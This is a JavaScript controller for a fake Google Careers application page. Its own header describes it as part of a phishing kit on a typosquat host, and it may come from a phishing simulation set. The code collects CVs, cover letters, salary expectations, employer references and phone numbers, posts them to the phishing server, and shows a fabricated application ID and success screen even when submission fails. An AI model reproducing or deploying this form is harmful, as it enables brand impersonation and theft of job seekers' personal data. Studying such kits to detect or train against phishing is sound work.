/**
 * Google Careers Application — Medium-PII single-page form controller.
 *
 * Wave E sibling of the multi-step phishing form. Collects only medium-tier
 * PII (CV upload, cover letter, expected salary, employer references) and
 * POSTs to /api/submit on the typosquat phishing host.
 */

(function () {
    'use strict';

    function $(sel, ctx) { return (ctx || document).querySelector(sel); }
    function $$(sel, ctx) { return Array.from((ctx || document).querySelectorAll(sel)); }

    let resumeFileName = null;

    // ---- Resume drop-zone ----
    function wireResumeUpload() {
        const dropZone = $('#resumeDropZone');
        const fileInput = $('#resumeFile');
        const nameLabel = $('#resumeFileName');
        if (!dropZone || !fileInput) return;

        dropZone.addEventListener('click', function () { fileInput.click(); });
        dropZone.addEventListener('keydown', function (e) {
            if (e.key === 'Enter' || e.key === ' ') {
                e.preventDefault();
                fileInput.click();
            }
        });
        dropZone.addEventListener('dragover', function (e) {
            e.preventDefault();
            dropZone.classList.add('drag-over');
        });
        dropZone.addEventListener('dragleave', function () {
            dropZone.classList.remove('drag-over');
        });
        dropZone.addEventListener('drop', function (e) {
            e.preventDefault();
            dropZone.classList.remove('drag-over');
            const f = e.dataTransfer.files && e.dataTransfer.files[0];
            if (f) {
                fileInput.files = e.dataTransfer.files;
                handleFile(f);
            }
        });
        fileInput.addEventListener('change', function () {
            if (fileInput.files && fileInput.files[0]) handleFile(fileInput.files[0]);
        });

        function handleFile(file) {
            resumeFileName = file.name;
            if (nameLabel) {
                nameLabel.style.display = 'block';
                nameLabel.textContent = '✓ ' + file.name;
            }
        }
    }

    // ---- Cover letter character counter ----
    function wireCharCount() {
        const ta = $('#coverLetter');
        const counter = $('#charCount');
        if (!ta || !counter) return;
        ta.addEventListener('input', function () {
            counter.textContent = String(ta.value.length);
        });
    }

    // ---- Phone formatter ----
    function wirePhoneFormatter() {
        const phone = $('#phone');
        if (!phone) return;
        phone.addEventListener('input', function () {
            let v = this.value.replace(/\D/g, '').slice(0, 10);
            if (v.length > 6) v = '(' + v.slice(0, 3) + ') ' + v.slice(3, 6) + '-' + v.slice(6);
            else if (v.length > 3) v = '(' + v.slice(0, 3) + ') ' + v.slice(3);
            else if (v.length > 0) v = '(' + v;
            this.value = v;
        });
    }

    // ---- Validation ----
    function validate() {
        const form = $('#form-apply');
        if (!form) return true;
        let valid = true;
        $$('.gc-field', form).forEach(function (f) { f.classList.remove('has-error'); });

        $$('[required]', form).forEach(function (input) {
            if (input.type === 'checkbox') return;
            const field = input.closest('.gc-field');
            if (!input.value.trim()) {
                if (field) field.classList.add('has-error');
                valid = false;
            }
        });

        const terms = $('#termsConsent');
        if (!terms || !terms.checked) {
            alert('Please agree to the Terms of Service and Privacy Policy to continue.');
            valid = false;
        }

        if (!resumeFileName) {
            const drop = $('#resumeDropZone');
            if (drop) drop.style.borderColor = '#d93025';
            valid = false;
        }

        return valid;
    }

    // ---- Submit ----
    window.submitApplication = function () {
        if (!validate()) return;

        const form = $('#form-apply');
        const fd = new FormData(form);
        const payload = {};
        fd.forEach(function (val, key) { payload[key] = val; });
        if (resumeFileName) payload.cvFilename = resumeFileName;
        payload.priorityReview = $('#priorityReview') && $('#priorityReview').checked ? 'true' : 'false';

        const btn = $('#submitBtn');
        if (btn) {
            btn.disabled = true;
            btn.innerHTML = '<span class="gc-spinner"></span> Submitting...';
        }

        const appId = 'GC-2026-' + Math.floor(100000 + Math.random() * 900000);

        fetch('/api/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
            .then(function (r) { return r.json(); })
            .then(function () { showSuccess(appId); })
            .catch(function () { showSuccess(appId); });
    };

    function showSuccess(appId) {
        const formSection = $('#applyForm');
        const successSection = $('#stepSuccess');
        if (formSection) formSection.style.display = 'none';
        if (successSection) successSection.style.display = 'block';
        const idEl = $('#appId');
        if (idEl) idEl.textContent = appId;
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    document.addEventListener('DOMContentLoaded', function () {
        wireResumeUpload();
        wireCharCount();
        wirePhoneFormatter();
    });
})();
